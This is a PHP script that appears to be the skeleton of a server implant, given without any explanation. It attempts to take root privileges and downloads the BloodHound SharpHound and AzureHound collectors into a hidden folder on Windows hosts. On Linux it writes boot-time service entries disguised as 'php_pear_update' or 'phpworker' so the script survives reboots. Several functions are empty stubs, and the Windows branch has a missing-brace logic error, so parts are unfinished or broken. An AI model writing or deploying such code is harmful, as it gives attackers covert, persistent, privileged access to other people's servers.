<?php
ini_set("safe_mode", "0");
umask(0);
posix_setuid(0);
define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);

function checkfs(){
    if (substr(php_uname(), 0, 7) == 'Windows') {
        $wh = new COM();
        if (!is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\")))
        $t = sys_get_temp_dir() . "\\" . substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
        shell_exec("mkdir ". $t);
        shell_exec("attrib +h +s ". $t);
        shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile ". $t ."\\af.ps1");
        shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile ". $t ."\\af1.ps1");
        shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile ". $t ."\\af2.exe");
    } else {
        if (is_dir("/etc/service") && !file_exists("/etc/service/php_pear_update")){
            $f = fopen("/etc/service/php_pear_update", "w");
            fwrite($f, "#!/bin/sh\nexec $(which php) ". SELF_SCRIPT);
            fflush($f);
            fclose($f);
        }elseif (is_dir("/etc/init/") && !file_exists("/etc/init/phpworker.conf")){
            $ff = fopen("/etc/init/phpworker.conf", "w");
            fwrite($ff, "start on startup\nstop on shutdown\nrespawn\nrespawn limit 20 5\nscript\n\t[\$(exec $(which php) -f ". SELF_SCRIPT . ") = 'ERROR'] && ( stop; exit 1; )");
            fflush($ff);
            fclose($ff);
        }elseif (is_dir("/var/service") && !file_exists("/var/service/php_pear_update/run")){
            $ffe = fopen("/var/service/php_pear_update/run", "w");
            fwrite($ffe, "#!/bin/sh\nexec setuidgid sh -c 'exec $(which php) ". SELF_SCRIPT ."'");
            fflush($ffe);
            fclose($ffe);
        }

    }

}

function checkin_timer($time){
    $uu = substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);

}

function fork_control(){

}

function watcher($lo){

}